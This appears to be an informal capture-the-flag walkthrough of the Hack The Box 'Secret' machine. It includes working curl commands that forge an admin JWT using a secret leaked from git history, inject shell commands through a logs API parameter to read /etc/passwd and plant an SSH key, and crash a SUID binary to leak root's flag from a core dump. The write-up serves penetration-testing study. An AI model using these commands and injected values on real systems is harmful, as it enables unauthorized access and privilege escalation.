@@ -1,0 +1,161 @@
+namp scans
+22 	SSH 	OpenSSH 8.2p1
+80 	HTTP 	nginx 1.18.0
+3000 	HTTP 	Node.js
+
+Manual Enumeration
+Just Visting websites on ports 80,3000 both looked same. Just gazing through website 2 features looks intresting.
+
+traversing
+
+it just redirets to /api endpoint
+
+use gobuster to look for any other directories that may not be seen
+
+Source Code
+
+The website seeming gives out it source code on website just like any other opensource projects. So let’s download it and inspects for something good. Looking at the directory listing of source code it looks like it a git repository. It was all confirmed by ohmyzsh in my case.
+
+I used git extractor tools to extract everything from the git archives. Link to the GitTools I Used https://github.com/internetwache/GitTools
+mkdir dump
+/Downloads/GitTools/Extractor/extractor.sh local-web/ dump
+
+and it will take time as it is a big repository so give it some time to complete.
+
+so let’s check /routes/auth.js we can see there is the /register endpoint to register user so let’s confirm this by sending a post request as get requests are not allowed.
+
+code
+➜  local-web git:(master) curl -X POST -H 'Content-Type: application/json' -v http://10.10.11.120.htb/api/user/register --data '{"foo": "bar"}'
+Note: Unnecessary use of -X or --request, POST is already inferred.
+*   Trying 10.10.11.120:80...
+* Connected to secret.htb (10.10.11.120) port 80 (#0)
+> POST /api/user/register HTTP/1.1
+> Host: secret.htb
+> User-Agent: curl/7.74.0
+> Accept: */*
+> Content-Type: application/json
+> Content-Length: 14
+> 
+* upload completely sent off: 14 out of 14 bytes
+* Mark bundle as not supporting multiuse
+< HTTP/1.1 400 Bad Request
+< Server: nginx/1.18.0 (Ubuntu)
+< Date: Sun, 31 Oct 2021 05:20:49 GMT
+< Content-Type: text/html; charset=utf-8
+< Content-Length: 18
+< Connection: keep-alive
+< X-Powered-By: Express
+< ETag: W/"12-FCVaNPnXYf0hIGYsTUTYByRq5/U"
+< 
+* Connection #0 to host secret.htb left intact
+"name" is required
+
+looks like we have a valid endpoint so let’s see what data it is expecting us to send in order to register a user. Looks like it expects us to give name,email,password in order to register the user. Looks like this schema is also defined in validation.js
+
+Git Dump Enumeration
+➜  dump ls -al
+total 32
+drwxr-xr-x 8 kali kali 4096 Oct 31 00:53 .
+drwxr-xr-x 4 kali kali 4096 Oct 31 00:30 ..
+drwxr-xr-x 7 kali kali 4096 Oct 31 00:35 0-4e5547295cfe456d8ca7005cb823e1101fd1f9cb
+drwxr-xr-x 7 kali kali 4096 Oct 31 00:39 1-55fe756a29268f9b4e786ae468952ca4a8df1bd8
+drwxr-xr-x 7 kali kali 4096 Oct 31 00:43 2-e297a2797a5f62b6011654cf6fb6ccb6712d2d5b
+drwxr-xr-x 7 kali kali 4096 Oct 31 00:47 3-de0a46b5107a2f4d26e348303e76d85ae4870934
+drwxr-xr-x 7 kali kali 4096 Oct 31 00:53 4-3a367e735ee76569664bf7754eaaade7c735d702
+drwxr-xr-x 7 kali kali 4096 Oct 31 00:57 5-67d8da7a0e53d8fadeb6b36396d86cdcd4f6ec78
+
+one thing that we know from above manual enumeration is that it used secret to sign JWT tokens so let’s hunt for it. Looking through all the commit I found token in first 2 commits.
+
+➜  dump cat 0-4e5547295cfe456d8ca7005cb823e1101fd1f9cb/.env
+DB_CONNECT = 'mongodb://127.0.0.1:27017/auth-web'
+TOKEN_SECRET = gXr67TtoQL8TShUc8XYsK2HvsBYfyQSFCFZe4MQp7gRpFuMkKjcM72CNQN4fMfbZEKx4i7YiWuNAkmuTcdEriCMm9vPAYkhpwPTiuVwVhvwE
+➜  dump cat 1-55fe756a29268f9b4e786ae468952ca4a8df1bd8/.env
+DB_CONNECT = 'mongodb://127.0.0.1:27017/auth-web'
+TOKEN_SECRET = gXr67TtoQL8TShUc8XYsK2HvsBYfyQSFCFZe4MQp7gRpFuMkKjcM72CNQN4fMfbZEKx4i7YiWuNAkmuTcdEriCMm9vPAYkhpwPTiuVwVhvwE
+
+So now we have the secret let’s go into details of how the token is signed. you can check that on /routes/verifytoken.js
+
+let’s just create a sample token using the secret found.
+
+Register user
+curl -H "Content-Type: application/json" -X POST 10.10.11.120/api/user/register -d '{"name": "myusername","email": "me@mail.com","password": "mypassword"}' 
+
+We registered a user myusername. Now let’s try and login. For login we know we need to send email and password.(from validation.js)
+
+login as the registered user
+curl -H "Content-Type: application/json" -X POST 10.10.11.120/api/user/login -d '{"email": "me@mail.com","password": "mypassword"}'
+
+
+get a token and tinker the token to get admin token then try login as an admin using jwt_tools
+the code 
+
+python3 jwt_tool.py eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MWM0MjY4ZGU4ZjY4NTA0NWQzNmRjNWYiLCJuYW1lIjoidGhvdW5hbWUiLCJlbWFpbCI6InRob3VAbWFpbC5jb20iLCJpYXQiOjE2NDAyNDQ5MTJ9.2hk4grMpUS1WyEjnN5_V2VoKzXb4QvzCQ3o640pKjjY  -I -S hs256 -pc 'name' -pv 'theadmin' -p 'gXr67TtoQL8TShUc8XYsK2HvsBYfyQSFCFZe4MQp7gRpFuMkKjcM72CNQN4fMfbZEKx4i7YiWuNAkmuTcdEriCMm9vPAYkhpwPTiuVwVhvwE'
+
+
+curl -H 'auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MWM0MTg4OWU4ZjY4NTA0NWQzNmRjNTciLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6Im1lQG1haWwuY29tIiwiaWF0IjoxNjQwMjQxMzkxfQ.Ti6Ptqlz1bjdP7Nyjh9Ud6MX5SsTvzXV0N4ziIDq1a0' 'http://10.10.11.120/api/priv'
+
+curl -H 'auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MWM0MTg4OWU4ZjY4NTA0NWQzNmRjNTciLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6Im1lQG1haWwuY29tIiwiaWF0IjoxNjQwMjQxMzkxfQ.Ti6Ptqlz1bjdP7Nyjh9Ud6MX5SsTvzXV0N4ziIDq1a0' 'http://10.10.11.120/api/logs?file=/etc/passwd'
+
+getting the id
+curl -H 'auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MWM0MTg4OWU4ZjY4NTA0NWQzNmRjNTciLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6Im1lQG1haWwuY29tIiwiaWF0IjoxNjQwMjQxMzkxfQ.Ti6Ptqlz1bjdP7Nyjh9Ud6MX5SsTvzXV0N4ziIDq1a0' 'http://10.10.11.120/api/logs?file=;id'
+
+Create a ssh 
+ssh-keygen -t rsa -b 4096 -C 'drt@htb' -f secret.htb -P ''
+this will generate 2 files secret.htb and secrect.htb.pub
+
+First, store the contents of your public key into a bash variable:
+export PUBLIC_KEY=$(cat secret.htb.pub)
+
+make dir named dasith within your local enviroment and 
+mkdir -p /home/dasith/.ssh
+
+copy the contents of $PUBLIC_KEY to the directory that was just created
+echo $PUBLIC_KEY >> /home/dasith/.ssh/authorized_keys
+
+send the ssh to the web using the admin details 
+curl \  -i \ # print headers   -H 'auth-token:  eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MTkwMDg3YWYwM2VjMDA0NWVlNjg1M2YiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6ImRydEBkYXNpdGgud29ya3MiLCJpYXQiOjE2MzY4Mjk2NDh9.ENKbUxgLeuUXueEMn5DG_2LZUJemd11E842rQ1ekzLg' \   -G \ # send data values through GET instead of POST  --data-urlencode "file=index.js; mkdir -p /home/dasith/.ssh; echo $PUBLIC_KEY >> /home/dasith/.ssh/authorized_keys" \ # encode data parameters   'http://10.10.11.120/api/logs'
+
+
+after uploading it to the web you will get a http/1.1 200 OK
+This shows it was successfull then login using ssh 
+
+ssh -i secret.htb dasith@10.10.11.120
+ls -la to see what it has 
+cat the user.txt
+
+navigate through the folder to look for anything interesting
+cd into /opt folder you will see you will see that there are a few interesting things
+	1.code.c 
+	2.count 
+	3.valgrind.log
+	
+then within the same directory perform the following operations 
+ 	1. ./count 
+ 	enter the fields as /root/root.txt
+ 	then hit control Z to crash the system
+ 	ps to see the ongoing procress
+ 	kill -BUS and number according to the count
+ 	fg to see the dump
+ 	create a tmp folder /tmp/gappy
+ 	cd within the var folder to look into the crash file /var/crash
+ 	drwxrwxrwt  2 root   root    4096 Oct 31 13:24 .
+	drwxr-xr-x 14 root   root    4096 Aug 13 05:12 ..
+	-rw-r-----  1 root   root   27203 Oct  6 18:01 _opt_count.0.crash
+	-rw-r-----  1 dasith dasith 28127 Oct 31 13:24 _opt_count.1000.crash
+	-rw-r-----  1 root   root   24048 Oct  5 14:24 _opt_countzz.0.crash
+	within the /var/crash do apport-unpack _opt_count.1000.crash /tmp/gappy
+	cd to /tmp/gappy$ and ls -la
+	We have the coredump file so let’s check it out using strings or else it will give out gibberish output.
+	tmp/gappy$ strings CoreDump
+	with this you will get the string values for everything within CoreDump after that look carefully you will see the /root/root.txt
+	/root/root.txt and the flag example
+	<----REDACTED---->
+	Path: results a file? [y/N]: words      = 2
+	Total lines      = 2
+	root/root.txt
+	<--REDACTED-->aa9c3c6efe<--REDACTED-->
+	<----REDACTED---->
+
+yeah good job!!!!!!
+
+
